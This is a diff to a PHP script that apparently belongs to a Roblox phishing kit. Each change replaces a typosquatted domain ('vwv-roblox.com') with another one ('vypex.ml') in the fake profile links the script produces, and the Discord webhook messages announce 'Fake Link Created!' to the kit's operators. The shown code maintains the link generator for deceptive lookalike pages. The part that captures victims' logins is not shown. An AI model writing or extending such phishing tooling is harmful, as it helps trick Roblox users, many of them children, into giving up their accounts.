@@ -137,7 +137,7 @@ $hookObject = json_encode([
                 // Field 1
                 [
                     "name" => "Fake Link Created!",
-                    "value" => "```https://vwv-roblox.com/users/".$robloxuserid."/profile```",
+                    "value" => "```https://www.vypex.ml/users/".$robloxuserid."/profile```",
                     "inline" => true
                 ]
             ]
@@ -235,7 +235,7 @@ $hookObject2 = json_encode([
                 // Field 1
                 [
                     "name" => "Someone Create Fake Link Created In Your Website",
-                    "value" => "```https://vwv-roblox.com/users/".$robloxuserid."/profile```",
+                    "value" => "```https://www.vypex.ml/users/".$robloxuserid."/profile```",
                     "inline" => false
                 ],
                 [
@@ -302,7 +302,7 @@ curl_setopt_array( $ch, [
 $response = curl_exec( $ch );
 
 
-    echo "https://vwv-roblox.com/users/$robloxuserid/profile";
+    echo "https://www.vypex.ml/users/$robloxuserid/profile";
     
 }else{
     echo "Invalid Webhook!";
@@ -360,7 +360,7 @@ else{
 
             // Footer object
             "footer" => [
-                "text" => "WxR Notification",
+                "text" => "Vy Notification",
               "icon_url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
             ],
 
@@ -385,7 +385,7 @@ else{
                 // Field 1
                 [
                     "name" => "Someone Failed To Create Gen Generator",
-                    "value" => "```https://vwv-roblox.com/users/". $robloxuserid ."```",
+                    "value" => "```https://vypex.ml/users/". $robloxuserid ."```",
                     "inline" => true
                 ],
                 [
